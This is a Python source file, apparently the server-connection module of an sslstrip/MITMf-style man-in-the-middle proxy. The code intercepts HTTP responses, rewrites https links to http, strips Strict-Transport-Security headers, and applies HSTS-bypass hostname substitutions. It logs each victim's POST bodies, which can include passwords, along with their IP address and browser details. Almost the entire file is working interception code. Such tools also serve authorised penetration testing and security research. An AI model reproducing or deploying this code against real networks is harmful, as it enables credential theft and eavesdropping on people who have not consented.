# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import re 
import string
import random
import zlib
import gzip
import StringIO
import sys

from user_agents import parse
from twisted.web.http import HTTPClient
from URLMonitor import URLMonitor
from core.proxyplugins import ProxyPlugins
from core.logger import logger

formatter = logging.Formatter("%(asctime)s %(clientip)s [type:%(browser)s-%(browserv)s os:%(clientos)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
clientlog = logger().setup_logger("ServerConnection_clientlog", formatter)

formatter = logging.Formatter("%(asctime)s [ServerConnection] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logger().setup_logger("ServerConnection", formatter)

class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
    urlTypewww        = re.compile(r"https://www", re.IGNORECASE)
    urlwExplicitPort  = re.compile(r'https://www([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
    urlToken1         = re.compile(r'(https://[a-zA-Z0-9./]+\?)', re.IGNORECASE)
    urlToken2         = re.compile(r'(https://[a-zA-Z0-9./]+)\?{0}', re.IGNORECASE)
    #urlToken2        = re.compile(r'(https://[a-zA-Z0-9.]+/?[a-zA-Z0-9.]*/?)\?{0}', re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):

        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.clientInfo       = {}
        self.plugins          = ProxyPlugins()
        self.urlMonitor       = URLMonitor.getInstance()
        self.hsts             = URLMonitor.getInstance().hsts
        self.app              = URLMonitor.getInstance().app
        self.isImageRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False

        self.handle_post_output = False

    def sendRequest(self):
        if self.command == 'GET':

            clientlog.info(self.headers['host'], extra=self.clientInfo)

            log.debug("Full request: {}{}".format(self.headers['host'], self.uri))

        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.iteritems():
            log.debug("Sending header: ({}: {})".format(header, value))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):
        if self.handle_post_output is False: #So we can disable printing POST data coming from plugins 
            try:
                postdata = self.postData.decode('utf8') #Anything that we can't decode to utf-8 isn't worth logging
                if len(postdata) > 0:
                    clientlog.warning("POST Data ({}):\n{}".format(self.headers['host'], postdata), extra=self.clientInfo)
            except Exception as e:
                if ('UnicodeDecodeError' or 'UnicodeEncodeError') in e.message:
                    log.debug("{} Ignored post data from {}".format(self.clientInfo['clientip'], self.headers['host']))

        self.handle_post_output = False
        self.transport.write(self.postData)

    def connectionMade(self):
        log.debug("HTTP connection made.")

        try:
            user_agent = parse(self.headers['user-agent'])

            self.clientInfo["clientos"] = user_agent.os.family
            self.clientInfo["browser"]  = user_agent.browser.family
            try:
                self.clientInfo["browserv"] = user_agent.browser.version[0]
            except IndexError:
                self.clientInfo["browserv"] = "Other"
        except KeyError:
            self.clientInfo["clientos"] = "Other"
            self.clientInfo["browser"]  = "Other"
            self.clientInfo["browserv"] = "Other"

        self.clientInfo["clientip"] = self.client.getClientIP()

        self.plugins.hook()
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):

        values = self.plugins.hook()

        version = values['version']
        code    = values['code']
        message = values['message']

        log.debug("Server response: {} {} {}".format(version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        if (key.lower() == 'location'):
            value = self.replaceSecureLinks(value)
            if self.app:
                self.urlMonitor.addRedirection(self.client.uri, value)

        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True
                log.debug("Response is image content, not scanning")

        if (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                log.debug("Response is compressed")
                self.isCompressed = True

        elif (key.lower()== 'strict-transport-security'):
            clientlog.info("Zapped a strict-transport-security header", extra=self.clientInfo)

        elif (key.lower() == 'content-length'):
            self.contentLength = value

        elif (key.lower() == 'set-cookie'):
            self.client.responseHeaders.addRawHeader(key, value)

        else:
            self.client.setHeader(key, value)

    def handleEndHeaders(self):
        if (self.isImageRequest and self.contentLength != None):
            self.client.setHeader("Content-Length", self.contentLength)

        self.client.setHeader("Expires", "0")
        self.client.setHeader("Cache-Control", "No-Cache")

        if self.length == 0:
            self.shutdown()

        self.plugins.hook()

        if logging.getLevelName(log.getEffectiveLevel()) == "DEBUG":
            for header, value in self.headers.iteritems():
                log.debug("Receiving header: ({}: {})".format(header, value)) 

    def handleResponsePart(self, data):
        if (self.isImageRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isImageRequest):
            self.shutdown()
        else:
            #Gets rid of some generic errors
            try:
                HTTPClient.handleResponseEnd(self) 
            except:
                pass

    def handleResponse(self, data):
        if (self.isCompressed):
            log.debug("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()

        data = self.replaceSecureLinks(data)
        data = self.plugins.hook()['data']

        #log.debug("Read from server {} bytes of data:\n{}".format(len(data), data))
        log.debug("Read from server {} bytes of data".format(len(data)))

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))
        
        try:
            self.client.write(data)
        except:
            pass

        try:
            self.shutdown()
        except:
            log.info("Client connection dropped before request finished.")

    def replaceSecureLinks(self, data):
        if self.hsts:

            sustitucion = {}
            patchDict = self.urlMonitor.patchDict

            if patchDict:
                dregex = re.compile("({})".format("|".join(map(re.escape, patchDict.keys()))))
                data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)

            iterator = re.finditer(ServerConnection.urlExpression, data)       
            for match in iterator:
                url = match.group()

                log.debug("Found secure reference: " + url)
                nuevaurl=self.urlMonitor.addSecureLink(self.clientInfo['clientip'], url)
                log.debug("Replacing {} => {}".format(url,nuevaurl))
                sustitucion[url] = nuevaurl

            if sustitucion:
                dregex = re.compile("({})".format("|".join(map(re.escape, sustitucion.keys()))))
                data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)

            return data

        else:

            iterator = re.finditer(ServerConnection.urlExpression, data)

            for match in iterator:
                url = match.group()

                log.debug("Found secure reference: " + url)

                url = url.replace('https://', 'http://', 1)
                url = url.replace('&amp;', '&')
                self.urlMonitor.addSecureLink(self.clientInfo['clientip'], url)

            data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
            return re.sub(ServerConnection.urlType, 'http://', data)

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            try:
                self.client.finish()
                self.transport.loseConnection()
            except:
                pass
